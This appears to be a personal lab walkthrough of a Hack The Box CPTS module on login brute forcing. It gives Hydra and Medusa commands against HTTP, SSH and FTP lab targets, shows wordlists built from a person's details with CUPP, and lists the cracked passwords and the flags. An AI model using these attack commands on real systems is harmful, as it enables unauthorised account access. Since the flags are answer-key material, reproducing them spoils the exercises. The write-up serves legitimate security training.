---
title: CPTS labs - 15 Login Brute Forcing
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 15 Login Brute Forcing

## [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)


### Brute Force Attacks

**After successfully brute-forcing the PIN, what is the full flag the script returns?**

Run the provided script. Also you can do it from Burpsuite.

Results: HTB{Brut3_F0rc3_1s_P0w3rfu1}


**After successfully brute-forcing the target using the script, what is the full flag the script returns?**

Run the provided script. Also you can do it from Burpsuite.

HTB{Brut3_F0rc3_M4st3r}


### Hydra

**Basic HTTP Authentication- After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

```
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 94.237.63.111 -s 32110 http-get / 
```

Results: HTB{th1s_1s_4_f4k3_fl4g}

**Login Forms- After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 94.237.63.111 -s 47017 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
# Output: [47017][http-post-form] host: 94.237.63.111   login: admin   password: zxcvbnm

```

Results: HTB{W3b_L0gin_Brut3F0rc3}


### Medusa

What was the password for the ftpuser?

```
medusa -u sshuser -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -M ssh -h 83.136.253.44 -n 45938 -t 3
# Output: 2025-01-20 19:57:42 ACCOUNT FOUND: [ssh] Host: 83.136.253.44 User: sshuser Password: 1q2w3e4r5t [SUCCESS]

# Connect via ssh
ssh sshuser@83.136.253.44 -p 45938

# Reconnaissance
nmap localhost

# From the local target machine:
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
# Output: ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]

# From the target machine connect to FTP
ftp ftpuser@$ip
# Enter password: qqww1122
dir 
get flag.txt
quit

cat flag.txt
```

Results: qqww1122

**After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?**

Results: HTB{SSH_and_FTP_Bruteforce_Success}


### Custom Wordlists

**After successfully brute-forcing, and then logging into the target, what is the full flag you find?**


```
# Generate usernames
./username-anarchy Jane Smith > jane_smith_usernames.txt

# Generate passwords
cupp -i 
```

```
Output
> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 52058 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

```
# Filter passwords
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > dictionary-filtered.txt

# Launch hydra attack:
hydra -L jane_smith_usernames.txt -P dictionary-filtered.txt 94.237.50.7 -s 32234 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

# Output: [32234][http-post-form] host: 94.237.50.7   login: jane   password: 3n4J!!

# Login into the target
```

Results: HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}


### Skills Assessment Part 1

The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

**What is the password for the basic auth login?**

```bash
# We have the provided lists: usernames.txt and passwords.txt
hydra -L usernames.txt -P passwords.txt -f 83.136.253.44 -s 44641 http-get 

# Output: [44641][http-get] host: 83.136.253.44   login: admin   password: Admin123

```


Results: Admin123

**After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?**

```bash
# Access the site with user and password and the name is retrieved
```

Results: satwossh



### Skills Assessment Part 2

This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

What is the username of the ftp user you find via brute-forcing?

```
sudo nmap -sC -sV -Pn 83.136.253.73 -p 53002  
# output: 53002/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)

# Now we brute force ssh service with hydra
hydra -l satwossh -P passwords.txt -f 83.136.253.73  -s 53002  ssh
# Output: [53002][ssh] host: 83.136.253.73   login: satwossh   password: password1

# We access the service with creds: satwossh:password1
ssh satwossh@83.136.253.73 -p 53002 

# We see the content of our home folder and read the IncidentReport.txt:
ls
cat IncidentReport.txt
# We obtain an interesting name: "Thomas Smith". 

# We enumerate open services: 
nmap localhost
# Output: open ports: 21 and 22.

# We will use username-anarchy to generate a list of potential users:
echo "Thomas Smith" > realnames.txt
./username-anarchy -i realnames.txt
# we save the output under ~/namelist.txt

# We launch hydra
hydra -L namelist.txt -P passwords.txt -f 127.0.0.1 ftp
# output: [21][ftp] host: 127.0.0.1   login: thomas   password: chocolate!

# We access ftp
ftp thomas@127.0.0.1
# enter password when prompted: chocolate!

# Now, we browse and extract the flag.txt
dir 
get flag.txt
quit
cat flag.txt
```

Results: HTB{brut3f0rc1ng_succ3ssful}

What is the flag contained within flag.txt

